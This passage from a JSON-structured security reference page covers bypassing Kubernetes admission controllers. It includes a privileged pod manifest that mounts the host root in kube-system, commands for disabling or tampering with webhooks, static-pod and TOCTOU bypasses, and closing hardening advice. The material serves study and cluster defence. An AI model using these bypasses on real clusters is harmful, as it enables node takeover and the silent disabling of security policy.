        },
        {
            "title": "Cloud",
            "url": "/enumeration/cloud"
        }
    ],
    "skill_level": "Advanced",
    "prerequisites": "Kubernetes architecture, RBAC, OPA/Gatekeeper",
    "sections": [
        {
            "heading": "Understanding Admission Controllers",
            "type": "code_block",
            "content": [
                "# Admission flow:",
                "# 1. API Request \u2192 Authentication \u2192 Authorization \u2192 Admission Controllers \u2192 etcd",
                "",
                "# Types:",
                "# - Validating: Accept/reject requests",
                "# - Mutating: Modify requests before persistence",
                "",
                "# Common admission controllers:",
                "# - PodSecurityPolicy (deprecated) / PodSecurity",
                "# - OPA Gatekeeper",
                "# - Kyverno",
                "# - Admission webhooks (custom)"
            ]
        },
        {
            "heading": "Enumeration & Discovery",
            "subheadings": [
                {
                    "heading": "Identifying Active Controllers",
                    "type": "code_block",
                    "content": [
                        "# Check enabled validating and mutating webhooks",
                        "kubectl get validatingwebhookconfigurations",
                        "kubectl get mutatingwebhookconfigurations",
                        "",
                        "# Detailed webhook inspection",
                        "kubectl get --raw /apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations | jq",
                        "",
                        "# Check OPA Gatekeeper constraints",
                        "kubectl get constraints",
                        "kubectl get constrainttemplates"
                    ]
                },
                {
                    "heading": "Detecting Policy Gaps",
                    "type": "code_block",
                    "content": [
                        "# Identify excluded namespaces (often kube-system, gatekeeper-system)",
                        "kubectl get validatingwebhookconfiguration <name> -o json | jq '.webhooks[].namespaceSelector'",
                        "",
                        "# Check failurePolicy (Ignore = bypass when webhook fails)",
                        "kubectl get validatingwebhookconfiguration -o json | jq '.items[].webhooks[].failurePolicy'"
                    ]
                }
            ]
        },
        {
            "heading": "Universal Policy Bypass Techniques",
            "subheadings": [
                {
                    "heading": "Excluded Namespace Abuse",
                    "type": "code_block",
                    "content": [
                        "# If kube-system is excluded, create privileged pod there",
                        "cat <<EOF | kubectl apply -f -",
                        "apiVersion: v1",
                        "kind: Pod",
                        "metadata:",
                        "  name: privileged-pod",
                        "  namespace: kube-system",
                        "spec:",
                        "  containers:",
                        "  - name: pwned",
                        "    image: ubuntu",
                        "    securityContext:",
                        "      privileged: true",
                        "    volumeMounts:",
                        "    - name: hostroot",
                        "      mountPath: /host",
                        "  volumes:",
                        "  - name: hostroot",
                        "    hostPath:",
                        "      path: /",
                        "EOF"
                    ]
                },
                {
                    "heading": "TOCTOU & Ephemeral Bypass",
                    "type": "list",
                    "content": [
                        "**TOCTOU**: Create a compliant deployment, then patch the pod directly if update validation is weak.",
                        "**Ephemeral Containers**: Validation might miss ephemeral containers added via `kubectl debug`.",
                        "**Static Pods**: Directly write manifests to `/etc/kubernetes/manifests/` on a node to bypass the API server entirely."
                    ]
                }
            ]
        },
        {
            "heading": "Targeted Bypasses: OPA & Kyverno",
            "subheadings": [
                {
                    "heading": "OPA Gatekeeper Logic Gaps",
                    "type": "list",
                    "content": [
                        "**Partial Container Check**: If policy only validates the first container, place malicious images in subsequent ones.",
                        "**Rego Parsing Issues**: Bypass image tag restrictions (e.g., `latest`) by using digests or removing the colon entirely.",
                        "**Sync Resource Desync**: Manipulate resources that OPA syncs for referential constraints to trick validation logic."
                    ]
                },
                {
                    "heading": "Kyverno Limitations",
                    "type": "list",
                    "content": [
                        "**Orphaned Resources**: Remove `ownerReferences` from Kyverno-generated resources to modify them without triggering regeneration.",
                        "**Background Scan Lag**: Kyverno's background scans are distinct from admission; older resources may remain non-compliant."
                    ]
                }
            ]
        },
        {
            "heading": "Admission Webhook Exploitation",
            "subheadings": [
                {
                    "heading": "Availability Attacks (DoS)",
                    "type": "list",
                    "content": [
                        "If `failurePolicy: Ignore`, DoS the webhook pods to force a 'fail-open' state.",
                        "Use `kubectl scale` to zero out the webhook deployment if you have necessary RBAC.",
                        "Inject a `NetworkPolicy` to block the API server from reaching the webhook service."
                    ]
                },
                {
                    "heading": "Webhook Tampering",
                    "type": "code_block",
                    "content": [
                        "# Modify configuration to add exclusion for your namespace",
                        "kubectl edit validatingwebhookconfiguration <name>",
                        "",
                        "# Set failurePolicy to 'Ignore' to ensure bypass if webhook becomes unavailable",
                        "failurePolicy: Ignore"
                    ]
                }
            ]
        },
        {
            "heading": "Hardening & Detection",
            "subheadings": [
                {
                    "heading": "Monitoring Commands",
                    "type": "code_block",
                    "content": [
                        "# Audit denied requests",
                        "kubectl get events --field-selector reason=FailedCreate -A",
                        "",
                        "# Stream Gatekeeper audit logs",
                        "kubectl logs -n gatekeeper-system deployment/gatekeeper-audit -f"
                    ]
                },
                {
                    "heading": "Security Recommendations",
                    "type": "list",
                    "content": [
                        "Always set `failurePolicy: Fail` for critical security webhooks.",
                        "Ensure admission policies validate **UPDATE** operations in addition to **CREATE**.",
                        "Monitor and restrict the use of excluded namespaces (kube-system, etc.).",
                        "Implement CEL (Common Expression Language) for more robust, performant policy logic."
                    ]
                }
            ]
        },
        {
